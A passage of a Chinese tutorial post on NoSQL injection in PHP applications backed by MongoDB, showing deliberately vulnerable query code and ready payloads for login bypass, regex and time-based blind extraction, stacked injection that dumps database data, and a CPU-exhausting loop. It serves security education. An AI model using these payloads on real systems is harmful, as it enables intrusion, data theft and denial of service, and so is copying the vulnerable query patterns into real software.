class="hljs-string">&#x27;sec_test.users&#x27;</span>, <span class="hljs-variable">$query</span>)-&gt;toArray();<br><br><span class="hljs-variable">$count</span> = count(<span class="hljs-variable">$result</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$count</span>&gt;<span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$result</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$user</span>) &#123;<br>        <span class="hljs-variable">$user</span>=(<span class="hljs-keyword">array</span>)<span class="hljs-variable">$user</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;username: &#x27;</span>.<span class="hljs-variable">$user</span>[<span class="hljs-string">&#x27;uname&#x27;</span>].<span class="hljs-string">&quot;\n&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;password: &#x27;</span>.<span class="hljs-variable">$user</span>[<span class="hljs-string">&#x27;pwd&#x27;</span>].<span class="hljs-string">&quot;\n&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;用户不存在&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure></p>
+<p>与旧版写法二类似。</p>
+<p><strong>新版写法三</strong><br>还有人喜欢用 <code>Command</code> 去实现 Mongo 的 <code>distinct</code> 方法。举例如下：<br><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$manager</span> = <span class="hljs-keyword">new</span> MongoDB\Driver\Manager();<br><br><span class="hljs-variable">$uname</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$pwd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><br><span class="hljs-variable">$cmd</span> = <span class="hljs-keyword">new</span> MongoDB\Driver\Command([<br><span class="hljs-string">&#x27;eval&#x27;</span>=&gt; <span class="hljs-string">&quot;db.users.distinct(&#x27;uname&#x27;, &#123;uname: &#x27;&quot;</span>.<span class="hljs-variable">$uname</span>.<span class="hljs-string">&quot;&#x27;, pwd: &#x27;&quot;</span>.<span class="hljs-variable">$pwd</span>.<span class="hljs-string">&quot;&#x27;&#125;)&quot;</span><br>]);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;db.users.distinct(&#x27;uname&#x27;, &#123;uname: &#x27;&quot;</span>.<span class="hljs-variable">$uname</span>.<span class="hljs-string">&quot;&#x27;, pwd: &#x27;&quot;</span>.<span class="hljs-variable">$pwd</span>.<span class="hljs-string">&quot;&#x27;&#125;)&quot;</span>;<br><span class="hljs-variable">$result</span> = <span class="hljs-variable">$manager</span>-&gt;executeCommand(<span class="hljs-string">&#x27;sec_test&#x27;</span>, <span class="hljs-variable">$cmd</span>)-&gt;toArray();<br><span class="hljs-variable">$result</span> =((<span class="hljs-keyword">array</span>)<span class="hljs-variable">$result</span>[<span class="hljs-number">0</span>])[<span class="hljs-string">&#x27;retval&#x27;</span>];<br><span class="hljs-variable">$count</span> = count(<span class="hljs-variable">$result</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$count</span>&gt;<span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$result</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$user</span>) &#123;<br>        <span class="hljs-variable">$user</span>=(<span class="hljs-keyword">array</span>)<span class="hljs-variable">$user</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;username: &#x27;</span>.<span class="hljs-variable">$user</span>[<span class="hljs-string">&#x27;uname&#x27;</span>].<span class="hljs-string">&quot;\n&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;password: &#x27;</span>.<span class="hljs-variable">$user</span>[<span class="hljs-string">&#x27;pwd&#x27;</span>].<span class="hljs-string">&quot;\n&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;用户不存在&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure></p>
+<p>这个类似旧的写法三。</p>
+<p>接下来按照写法的不同，分别介绍注入的手段。<br>以下内容均以这个数据库为例：<br><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css">&gt; d<span class="hljs-selector-class">.find</span>()<br>&#123; &quot;_id&quot; : <span class="hljs-built_in">ObjectId</span>(<span class="hljs-string">&quot;5cc196960bc6687b80b15028&quot;</span>), <span class="hljs-string">&quot;id&quot;</span> : <span class="hljs-number">1</span>, <span class="hljs-string">&quot;uname&quot;</span> : <span class="hljs-string">&quot;admin&quot;</span>, <span class="hljs-string">&quot;pwd&quot;</span> : <span class="hljs-string">&quot;admin&quot;</span> &#125;<br>&#123; &quot;_id&quot; : <span class="hljs-built_in">ObjectId</span>(<span class="hljs-string">&quot;5cc196a30bc6687b80b15029&quot;</span>), <span class="hljs-string">&quot;id&quot;</span> : <span class="hljs-number">2</span>, <span class="hljs-string">&quot;uname&quot;</span> : <span class="hljs-string">&quot;admin123&quot;</span>, <span class="hljs-string">&quot;pwd&quot;</span> : <span class="hljs-string">&quot;123456&quot;</span> &#125;<br>&#123; &quot;_id&quot; : <span class="hljs-built_in">ObjectId</span>(<span class="hljs-string">&quot;5cc196af0bc6687b80b1502a&quot;</span>), <span class="hljs-string">&quot;id&quot;</span> : <span class="hljs-number">3</span>, <span class="hljs-string">&quot;uname&quot;</span> : <span class="hljs-string">&quot;root&quot;</span>, <span class="hljs-string">&quot;pwd&quot;</span> : <span class="hljs-string">&quot;toor&quot;</span> &#125;<br></code></pre></div></td></tr></table></figure></p>
+<h2 id="旧版写法一与新版写法一"><a href="#旧版写法一与新版写法一" class="headerlink" title="旧版写法一与新版写法一"></a>旧版写法一与新版写法一</h2><p>这两者注入的方式很类似，放在一起说，以新版的为例。<br>由于参数是数组，不是直接拼接字符串，也就意味着无法破坏原有语句。在这种情况下，只有一种类型注入的方式：<code>二维数组注入</code>（这个名字是我瞎编的）。</p>
+<h3 id="常规"><a href="#常规" class="headerlink" title="常规"></a>常规</h3><p>常规注入记有回显。可以接受这样的请求并且将查询的结果打印出来：<br><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">» curl &quot;192.168.26.173/?username=admin&amp;password=admin&quot;<br>username: <span class="hljs-keyword">admin</span><br><span class="hljs-keyword">password</span>: <span class="hljs-keyword">admin</span><br></code></pre></div></td></tr></table></figure><br>这个请求映射到数据库里的语句是类似这样的：<br><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">db.users.<span class="hljs-builtin-name">find</span>(&#123;username: <span class="hljs-string">&#x27;admin&#x27;</span>, password: <span class="hljs-string">&#x27;admin&#x27;</span>&#125;);<br></code></pre></div></td></tr></table></figure></p>
+<p>很明显我们可控的点为这两个<code>&#39;admin&#39;</code>。</p>
+<p>之前说过，试图逃逸单引号是不会成功的：<br><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">» <span class="hljs-built_in">curl</span> <span class="hljs-string">&quot;192.168.26.173/?username=admin&#x27;&amp;password=admin&quot;</span><br>未找到<br></code></pre></div></td></tr></table></figure></p>
+<p>但是我们可以这样：<br><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css">db<span class="hljs-selector-class">.users</span><span class="hljs-selector-class">.find</span>(&#123;username: &#123;<span class="hljs-string">&#x27;$ne&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>&#125;, password: &#123;<span class="hljs-string">&#x27;$ne&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>&#125;&#125;);<br></code></pre></div></td></tr></table></figure></p>
+<p>那么怎么让原来的<code>&#39;admin&#39;</code>变为<code>&#123;&#39;$ne&#39;: &#39;&#39;&#125;</code>呢？这个语句对应到 PHP 那边的 payload 就是二维数组：<br><figure class="highlight vbnet"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vbnet">» curl <span class="hljs-comment">&#x27;http://192.168.26.173/?username\[$ne\]=&amp;password\[$ne\]=&#x27;</span><br><span class="hljs-symbol">username:</span> admin<br><span class="hljs-symbol">password:</span> admin<br><span class="hljs-symbol">username:</span> admin123<br><span class="hljs-symbol">password:</span> admin123<br><span class="hljs-symbol">username:</span> root<br><span class="hljs-symbol">password:</span> toor<br></code></pre></div></td></tr></table></figure><br>利用此特性，我们可以传入数据，是数组的键名为一个操作符（大于：<code>$gt</code>，小于：<code>$lt</code> 等等），完成一些我们想要的查询语句。</p>
+<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>回想一想上面的例子，假如页面不会把数据打印出来呢？只是告诉你成功或者失败，那么就是我们在 MySQL 里遇到的布尔盲注了。布尔盲注重点在于怎么逐个提取字符，MySQL 里我们可以采用<code>substr</code>，而在 MongoDB 里我们有 <code>$regex</code>。</p>
+<p>示例：<br><figure class="highlight dart"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dart">db.users.find(&#123;username: &#123;<span class="hljs-string">&#x27;<span class="hljs-subst">$regex</span>&#x27;</span>: <span class="hljs-string">&#x27;^a&#x27;</span>&#125;, password: &#123;<span class="hljs-string">&#x27;<span class="hljs-subst">$ne</span>&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>&#125;&#125;); <span class="hljs-comment">// 猜解第一个字符</span><br><br>db.users.find(&#123;username: &#123;<span class="hljs-string">&#x27;<span class="hljs-subst">$regex</span>&#x27;</span>: <span class="hljs-string">&#x27;^ad&#x27;</span>&#125;, password: &#123;<span class="hljs-string">&#x27;<span class="hljs-subst">$ne</span>&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>&#125;&#125;); <span class="hljs-comment">// 猜解第一个字符</span><br><br>db.users.find(&#123;username: &#123;<span class="hljs-string">&#x27;<span class="hljs-subst">$regex</span>&#x27;</span>: <span class="hljs-string">&#x27;^adm&#x27;</span>&#125;, password: &#123;<span class="hljs-string">&#x27;<span class="hljs-subst">$ne</span>&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>&#125;&#125;); <span class="hljs-comment">// 猜解第一个字符</span><br><br>db.users.find(&#123;username: &#123;<span class="hljs-string">&#x27;<span class="hljs-subst">$regex</span>&#x27;</span>: <span class="hljs-string">&#x27;^admi&#x27;</span>&#125;, password: &#123;<span class="hljs-string">&#x27;<span class="hljs-subst">$ne</span>&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>&#125;&#125;); <span class="hljs-comment">// 猜解第一个字符</span><br><br>db.users.find(&#123;username: &#123;<span class="hljs-string">&#x27;<span class="hljs-subst">$regex</span>&#x27;</span>: <span class="hljs-string">&#x27;^admin&#x27;</span>&#125;, password: &#123;<span class="hljs-string">&#x27;<span class="hljs-subst">$ne</span>&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>&#125;&#125;); <span class="hljs-comment">// 猜解第一个字符</span><br>...<br></code></pre></div></td></tr></table></figure></p>
+<p><strong>正则表达式玩的 6，MongoDB 注入没烦恼</strong> (狗头)</p>
+<h2 id="旧版写法二与新版写法二"><a href="#旧版写法二与新版写法二" class="headerlink" title="旧版写法二与新版写法二"></a>旧版写法二与新版写法二</h2><p><code>$where</code> 操作符是可以执行 JavaScript 语句的。如果版本在 2.4 之前，通过 <code>$where</code> 操作符使用 <code>map-reduce</code>、<code>group</code> 命令可以访问到 MongoDB shell 中的全局函数和属性，如 db。也就是说可以在自定义的函数里获取数据库的所有信息。</p>
+<h3 id="常规-1"><a href="#常规-1" class="headerlink" title="常规"></a>常规</h3><p>由于存在回显，我们可以通过 <code>return</code> 来返回任意的数据。</p>
+<blockquote>
+<p>如果 <code>db</code> 能用</p>
+</blockquote>
+<p>有 2 类 payload：</p>
+<ul>
+<li>所有的数据库名<figure class="highlight scilab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs scilab">$uname = <span class="hljs-string">&quot;&#x27;</span>||<span class="hljs-number">1</span>) <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&#x27;username&#x27;</span>: tojson(db.getCollectionNames()), <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;hacked&#x27;</span>&#125;&#125;<span class="hljs-comment">//&quot;</span><br>$<span class="hljs-built_in">pwd</span> = <span class="hljs-string">&quot;anything&quot;</span><br></code></pre></div></td></tr></table></figure>
+相当于<figure class="highlight ada"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ada">$<span class="hljs-keyword">function</span> <span class="hljs-title">=</span> &quot;<span class="hljs-keyword">function</span>() &#123;if(this.uname == &#x27;&#x27;||1) <span class="hljs-keyword">return</span> <span class="hljs-type">&#123;&#x27;username&#x27;:</span> tojson(db.getCollectionNames()), <span class="hljs-symbol">&#x27;password</span>&#x27;: <span class="hljs-symbol">&#x27;hacked</span>&#x27;&#125;&#125;//&#x27; &amp;&amp; this.pwd == <span class="hljs-symbol">&#x27;anything</span>&#x27;) <span class="hljs-keyword">return</span> &#123;<span class="hljs-symbol">&#x27;username</span>&#x27;: this.uname, <span class="hljs-symbol">&#x27;password</span>&#x27;: this.pwd&#125;&#125;<span class="hljs-string">&quot;;</span><br></code></pre></div></td></tr></table></figure></li>
+<li>其他<br>类似的 payload 还有很多，毕竟<code>db</code>能用的函数非常多</li>
+</ul>
+<p>另一类的 payload 和 👇 一样</p>
+<blockquote>
+<p>如果 <code>db</code> 不能用</p>
+</blockquote>
+<p>这类 payload 就是使得 <code>if</code> 永真：</p>
+<ul>
+<li>数据库里的所有数据（也可以当做万能密码使用）<figure class="highlight scilab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs scilab">$uname = <span class="hljs-string">&quot;anything&quot;</span><br>$<span class="hljs-built_in">pwd</span>=<span class="hljs-string">&quot;admin&#x27;</span> || <span class="hljs-string">&#x27;&#x27;</span> == <span class="hljs-string">&#x27;&quot;</span><br></code></pre></div></td></tr></table></figure>
+相当于<figure class="highlight qml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs qml">$<span class="hljs-function"><span class="hljs-keyword">function</span> = &quot;<span class="hljs-title">function</span>(<span class="hljs-params"></span>) </span>&#123;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">this</span>.uname == <span class="hljs-string">&#x27;anything&#x27;</span> &amp;&amp; <span class="hljs-keyword">this</span>.pwd == <span class="hljs-string">&#x27;admin&#x27;</span> || <span class="hljs-string">&#x27;&#x27;</span> == <span class="hljs-string">&#x27;&#x27;</span>) <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-keyword">this</span>.uname, <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-keyword">this</span>.pwd&#125;&#125;<span class="hljs-string">&quot;;</span><br></code></pre></div></td></tr></table></figure>
+应该就这一个利用场景</li>
+</ul>
+<h3 id="布尔盲注-1"><a href="#布尔盲注-1" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>如果页面没有回显，只有类似<code>成功/失败</code>，那么就只能用布尔盲注。</p>
+<blockquote>
+<p>如果 <code>db</code> 能用：</p>
+</blockquote>
+<ul>
+<li>获取所有数据库的数量：<figure class="highlight scilab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs scilab">$uname = <span class="hljs-string">&quot;&#x27;</span>||db.getCollectionNames().<span class="hljs-built_in">length</span>&gt;<span class="hljs-number">0</span>&amp;&amp;<span class="hljs-string">&#x27;1&#x27;</span>==<span class="hljs-string">&#x27;1&quot;</span><br></code></pre></div></td></tr></table></figure>
+相当于<figure class="highlight qml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs qml">$<span class="hljs-function"><span class="hljs-keyword">function</span> = &quot;<span class="hljs-title">function</span> <span class="hljs-title">q</span>(<span class="hljs-params"></span>) </span>&#123;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">this</span>.uname == <span class="hljs-string">&#x27;&#x27;</span> &amp;&amp; db.getCollectionNames().length &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-string">&#x27;1&#x27;</span> == <span class="hljs-string">&#x27;1&#x27;</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span> &#125;<span class="hljs-string">&quot;;</span><br></code></pre></div></td></tr></table></figure>
+这样慢慢地去判断。</li>
+<li>其他<br>类似的 payload 还有很多，毕竟<code>db</code>能用的函数非常多</li>
+</ul>
+<blockquote>
+<p>如果 <code>db</code> 不能用</p>
+</blockquote>
+<ul>
+<li>万能密码：<figure class="highlight scilab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs scilab">$uname = <span class="hljs-string">&quot;anything&quot;</span><br>$<span class="hljs-built_in">pwd</span>=<span class="hljs-string">&quot;admin&#x27;</span> || <span class="hljs-string">&#x27;&#x27;</span> == <span class="hljs-string">&#x27;&quot;</span><br></code></pre></div></td></tr></table></figure>
+相当于<figure class="highlight qml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs qml">$<span class="hljs-function"><span class="hljs-keyword">function</span> = &quot;<span class="hljs-title">function</span> <span class="hljs-title">q</span>(<span class="hljs-params"></span>) </span>&#123;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">this</span>.uname == <span class="hljs-string">&#x27;anything&#x27;</span> &amp;&amp; <span class="hljs-keyword">this</span>.pwd == <span class="hljs-string">&#x27;admin&#x27;</span> || <span class="hljs-string">&#x27;&#x27;</span> == <span class="hljs-string">&#x27;&#x27;</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>&#125;<span class="hljs-string">&quot;;</span><br></code></pre></div></td></tr></table></figure>
+应该只有这一个利用场景。</li>
+</ul>
+<p>最后，写法二还有一个好玩的 payload：<br><figure class="highlight scilab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs scilab">$uname = <span class="hljs-string">&quot;&#x27;</span>)&#123;&#125;<span class="hljs-keyword">else</span>&#123;var date = new Date(); <span class="hljs-keyword">do</span>&#123;curDate = new Date();&#125;<span class="hljs-keyword">while</span>(curDate-date&lt;<span class="hljs-number">10000</span>);&#125;&#125;)<span class="hljs-comment">//&quot;</span><br>$<span class="hljs-built_in">pwd</span>=<span class="hljs-string">&quot;admin&#x27;</span> || <span class="hljs-string">&#x27;&#x27;</span> == <span class="hljs-string">&#x27;&quot;</span><br></code></pre></div></td></tr></table></figure><br>相当于<br><figure class="highlight qml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs qml">$<span class="hljs-function"><span class="hljs-keyword">function</span> = &quot;<span class="hljs-title">function</span> <span class="hljs-title">q</span>(<span class="hljs-params"></span>) </span>&#123;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">this</span>.uname == <span class="hljs-string">&#x27;&#x27;</span>)&#123;&#125;<span class="hljs-title">else</span>&#123;<span class="hljs-keyword">var</span> <span class="hljs-built_in">date</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Date</span>(); <span class="hljs-title">do</span>&#123;curDate = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Date</span>();&#125;<span class="hljs-keyword">while</span>(curDate-<span class="hljs-built_in">date</span>&lt;<span class="hljs-number">10000</span>);&#125;&#125;)<span class="hljs-comment">//&#x27; &amp;&amp; this.pwd == &#x27;anything&#x27;) return true&#125;&quot;;</span><br></code></pre></div></td></tr></table></figure><br>利用循环将 cpu 使用率飙升至 100%，持续 10000 ms</p>
+<h2 id="旧版写法三与新版写法三"><a href="#旧版写法三与新版写法三" class="headerlink" title="旧版写法三与新版写法三"></a>旧版写法三与新版写法三</h2><p>直接将输入拼接到查询语句里，是很不妥的写法，一旦过滤出现问题，危害很大。</p>
+<h3 id="常规-2"><a href="#常规-2" class="headerlink" title="常规"></a>常规</h3><p>老样子，先通过逃逸引号的方式破坏原语句，再插入恶意语句，最后闭合剩下的原有语句：</p>
+<ul>
+<li>万能密码<br>payload:<figure class="highlight ini"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">user</span> = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-attr">pwd</span> = <span class="hljs-string">&quot;anything&quot;</span><br></code></pre></div></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="布尔盲注-2"><a href="#布尔盲注-2" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>和之前<code>旧版写法一与新版写法一</code>中的布尔盲注一样，也是利用<code>$regex</code>逐个拿字符。</p>
+<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>MongoDB 语句以<code>;</code>为分割。以 PHP 为例，由于 <code>execute</code> 支持多语句执行，所以可以闭合原语句后利用<code>;</code>在后面拼接任意新的语句，达到执行任意语句的效果。相当于有了 MongoDB shell，<code>db</code> 是可以随意使用的，能做的事情非常多。注意，较高版本的堆叠注入用不了注释<code>//</code></p>
+<ul>
+<li>万能密码<br>payload:<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$user</span> = <span class="hljs-string">&quot;admin&#x27;, <span class="hljs-subst">$where</span>: &quot;</span><span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-string">&quot;</span><br><span class="hljs-string"><span class="hljs-subst">$pwd</span> = &quot;</span>&#125;<span class="hljs-string">&quot;, uname:&#x27;admin&quot;</span><br></code></pre></div></td></tr></table></figure>
+效果如下：<figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus">db<span class="hljs-selector-class">.users</span><span class="hljs-selector-class">.distinct</span>(<span class="hljs-string">&#x27;uname&#x27;</span>, &#123;uname: <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-variable">$where</span>: <span class="hljs-string">&quot;function()&#123;return &#x27;, pwd: &#x27;&#125;&quot;</span>, uname:<span class="hljs-string">&#x27;admin&#x27;</span>&#125;)<br></code></pre></div></td></tr></table></figure>
+或者<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash">user = <span class="hljs-string">&quot;admin&#x27;, <span class="hljs-variable">$or</span>: [&#123;&quot;</span></span><br><span class="hljs-meta">$</span><span class="bash"><span class="hljs-built_in">pwd</span> = <span class="hljs-string">&quot;: &#123;<span class="hljs-variable">$ne</span>: &#x27;&#x27;&#125;&#125;,&#123;&#125;], uname:&#x27;admin&quot;</span></span><br></code></pre></div></td></tr></table></figure>
+效果如下：<figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus">db<span class="hljs-selector-class">.users</span><span class="hljs-selector-class">.distinct</span>(<span class="hljs-string">&#x27;uname&#x27;</span>, &#123;uname: <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-variable">$or</span>: <span class="hljs-selector-attr">[&#123;<span class="hljs-string">&#x27;, pwd: &#x27;</span>: &#123;$ne: <span class="hljs-string">&#x27;&#x27;</span>&#125;&#125;,&#123;&#125;]</span>, uname:<span class="hljs-string">&#x27;admin&#x27;</span>&#125;)<br></code></pre></div></td></tr></table></figure></li>
+<li>还可以把数据直接带出来：<br>payload:<figure class="highlight ini"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">username</span> = <span class="hljs-string">&quot;&#x27;&#125;); return [&#123;uname: tojson(db.getCollectionNames()), pwd: 2&#125;]; var a=(&#123;&#x27;a&#x27;: &quot;</span><br><span class="hljs-attr">password</span> = <span class="hljs-string">&quot;+&#x27;&quot;</span><br></code></pre></div></td></tr></table></figure>
+效果如下：<figure class="highlight kotlin"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs kotlin">db.users.distinct(<span class="hljs-string">&#x27;uname&#x27;</span>, &#123;uname: <span class="hljs-string">&#x27;&#x27;</span>&#125;); <span class="hljs-keyword">return</span> [&#123;uname: tojson(db.getName()), pwd: <span class="hljs-number">2</span>&#125;]; <span class="hljs-keyword">var</span> a=(&#123;<span class="hljs-string">&#x27;a&#x27;</span>: <span class="hljs-string">&#x27;, pwd: &#x27;</span>+<span class="hljs-string">&#x27;&#x27;</span>&#125;)<br></code></pre></div></td></tr></table></figure>
+此时返回的数据就为<code>&#123;uname: &quot;sec_test&quot;, pwd: 2&#125;</code>，可以拿到数据库名。利用这个办法，可以拿到很多数据：<ul>
+<li>所有数据库：<code>&#123;uname: tojson(db.getCollectionNames()), pwd: 2&#125;</code></li>
+<li>MongoDB 版本：<code>&#123;uname: tojson(db.version()), pwd: 2&#125;</code></li>
+<li>表<code>users</code>的第一条数据：<code>&#123;uname: tojson(db.users.find()[0]), pwd: 2&#125;;</code></li>
+</ul>
+</li>
+<li>时间盲注：<br>payload:<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash">uname = <span class="hljs-string">&quot;anything&#x27;&#125;);if (db.version() &gt; &quot;</span>0<span class="hljs-string">&quot;) &#123; sleep(1000) &#125;var b=(&#123;a:&#x27;1&quot;</span></span><br><span class="hljs-meta">$</span><span class="bash"><span class="hljs-built_in">pwd</span> = <span class="hljs-string">&quot;anything&quot;</span></span><br></code></pre></div></td></tr></table></figure>
